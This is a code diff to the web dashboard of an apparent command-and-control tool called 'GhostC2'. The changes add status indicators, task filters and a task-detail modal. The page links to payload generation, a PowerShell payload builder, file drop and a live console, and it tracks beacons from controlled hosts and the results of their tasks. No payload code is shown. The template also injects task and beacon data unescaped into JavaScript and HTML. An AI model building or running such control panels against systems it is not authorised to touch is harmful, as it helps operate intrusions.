@@ -18,6 +18,27 @@
         .form-section { margin-top: 40px; }
         .status { font-weight: bold; }
         tr:hover { background: #222; cursor: pointer; }
+
+        .status-dot {
+            height: 10px;
+            width: 10px;
+            border-radius: 50%;
+            display: inline-block;
+            margin-right: 6px;
+        }
+        .dot-active { background-color: #0f0; box-shadow: 0 0 5px #0f0; }
+        .dot-sleeping { background-color: #fa0; box-shadow: 0 0 5px #fa0; }
+        .dot-dead { background-color: #f00; box-shadow: 0 0 5px #f00; }
+
+        .tabs button {
+            background: #222;
+            color: #0f0;
+            border: 1px solid #0f0;
+            padding: 6px 12px;
+            margin-right: 10px;
+            cursor: pointer;
+        }
+
         #modal {
             display: none;
             position: fixed;
@@ -33,19 +54,32 @@
         }
         #modal h2 { color: #0f0; }
         #modal-close { float: right; cursor: pointer; color: #f00; font-weight: bold; }
+
+        #taskModal {
+            display: none;
+            position: fixed;
+            top: 20%;
+            left: 25%;
+            width: 50%;
+            background: #111;
+            border: 2px solid #0f0;
+            padding: 20px;
+            z-index: 9999;
+        }
+        #taskModal h3 { margin-top: 0; }
+        #taskModal .close { float: right; color: #f00; cursor: pointer; }
     </style>
 </head>
 <body>
     <a href="/console" style="color: #0f0; text-decoration: underline;">→ Open Live Console</a>
     <a href="/generate" style="color: #0f0; text-decoration: underline; margin-left: 20px;">→ Generate Payload</a>
     <a href="/upload" style="color: #0f0; text-decoration: underline; margin-left: 20px;">→ Upload for File Drop</a>
+    <br><br>
     <form method="GET" action="/generate_ps_payload">
-    <button type="submit">Generate PowerShell Payload</button>
+        <button type="submit">Generate PowerShell Payload</button>
     </form>
 
-
     <h1>👻 GhostC2 Beacon Dashboard</h1>
-
     <button id="toggleBtn" onclick="toggleInactive()">Hide Inactive Beacons</button>
 
     <table id="beacon-table">
@@ -74,7 +108,14 @@
 
     <div class="form-section">
         <h2>Task History</h2>
-        <table>
+        <div class="tabs">
+            <button onclick="filterTasksByActiveBeacons()">🟢 Active Beacon Tasks</button>
+            <button onclick="filterTasks('all')">📋 All</button>
+            <button onclick="filterTasks('pending')">🕐 Pending</button>
+            <button onclick="filterTasks('dispatched')">📤 Dispatched</button>
+            <button onclick="filterTasks('done')">✅ Done</button>
+        </div>
+        <table id="task-table">
             <thead>
                 <tr>
                     <th>ID</th>
@@ -86,7 +127,7 @@
             </thead>
             <tbody>
                 {% for task in tasks %}
-                <tr>
+                <tr onclick="openTaskModal('{{ task[0] }}', '{{ task[1] }}', '{{ task[2] }}', '{{ task[3] }}', `{{ task[4] | replace('\n', '\\n') }}`)">
                     <td>{{ task[0] }}</td>
                     <td>{{ task[1] }}</td>
                     <td>{{ task[2] }}</td>
@@ -96,6 +137,17 @@
                 {% endfor %}
             </tbody>
         </table>
+    </div>
+
+    <div id="taskModal">
+        <div class="close" onclick="document.getElementById('taskModal').style.display='none'">[X]</div>
+        <h3>📄 Task Detail</h3>
+        <p><strong>ID:</strong> <span id="t-id"></span></p>
+        <p><strong>Hostname:</strong> <span id="t-host"></span></p>
+        <p><strong>Command:</strong> <span id="t-cmd"></span></p>
+        <p><strong>Status:</strong> <span id="t-status"></span></p>
+        <p><strong>Result:</strong></p>
+        <pre id="t-result" style="white-space: pre-wrap;"></pre>
     </div>
 
     <div id="modal">
@@ -117,6 +169,14 @@
     let modalOpen = false;
     let showInactive = true;
 
+    function toggleInactive() {
+        showInactive = !showInactive;
+        document.querySelectorAll(".beacon-row.inactive").forEach(row => {
+            row.style.display = showInactive ? "" : "none";
+        });
+        document.getElementById("toggleBtn").textContent = showInactive ? "Hide Inactive Beacons" : "Show Inactive Beacons";
+    }
+
     async function loadBeacons() {
         const res = await fetch("/api/beacons");
         const beacons = await res.json();
@@ -126,14 +186,15 @@
         beacons.forEach(b => {
             const row = document.createElement("tr");
             let statusClass = "";
-            let status;
+            let statusDot = "";
+
             if (b.last_seen_seconds < 60) {
-                status = "🟢 Active";
+                statusDot = '<span class="status-dot dot-active"></span>Active';
             } else if (b.last_seen_seconds < 300) {
-                status = "🟡 Sleeping";
+                statusDot = '<span class="status-dot dot-sleeping"></span>Sleeping';
                 statusClass = "inactive";
             } else {
-                status = "🔴 Dead";
+                statusDot = '<span class="status-dot dot-dead"></span>Dead';
                 statusClass = "inactive";
             }
 
@@ -145,7 +206,7 @@
                 <td>${b.hostname}</td>
                 <td>${b.ip}</td>
                 <td>${b.payload}</td>
-                <td class="status">${status}</td>
+                <td class="status">${statusDot}</td>
                 <td>${Math.round(b.last_seen_seconds)}s ago</td>
             `;
 
@@ -155,17 +216,6 @@
 
             body.appendChild(row);
         });
-    }
-
-    function toggleInactive() {
-        showInactive = !showInactive;
-        const rows = document.querySelectorAll(".beacon-row.inactive");
-        rows.forEach(row => {
-            row.style.display = showInactive ? "" : "none";
-        });
-
-        const btn = document.getElementById("toggleBtn");
-        btn.textContent = showInactive ? "Hide Inactive Beacons" : "Show Inactive Beacons";
     }
 
     async function showBeaconDetails(hostname) {
@@ -219,6 +269,42 @@
                 document.getElementById("shell-output").textContent = txt;
             });
     }
+
+    function openTaskModal(id, host, cmd, status, result) {
+        document.getElementById("t-id").textContent = id;
+        document.getElementById("t-host").textContent = host;
+        document.getElementById("t-cmd").textContent = cmd;
+        document.getElementById("t-status").textContent = status;
+        document.getElementById("t-result").textContent = result;
+        document.getElementById("taskModal").style.display = "block";
+    }
+
+    function filterTasks(status) {
+        const rows = document.querySelectorAll("#task-table tbody tr");
+        rows.forEach(row => {
+            const rowStatus = row.children[3].textContent.trim().toLowerCase();
+            if (status === "all" || rowStatus === status.toLowerCase()) {
+                row.style.display = "";
+            } else {
+                row.style.display = "none";
+            }
+        });
+    }
+
+    async function filterTasksByActiveBeacons() {
+        const beaconRes = await fetch("/api/beacons");
+        const beacons = await beaconRes.json();
+        const activeHosts = beacons
+            .filter(b => b.last_seen_seconds < 60)
+            .map(b => b.hostname);
+
+        const rows = document.querySelectorAll("#task-table tbody tr");
+        rows.forEach(row => {
+            const hostname = row.children[1].textContent.trim();
+            row.style.display = activeHosts.includes(hostname) ? "" : "none";
+        });
+    }
+
 
     setInterval(() => {
         loadBeacons();
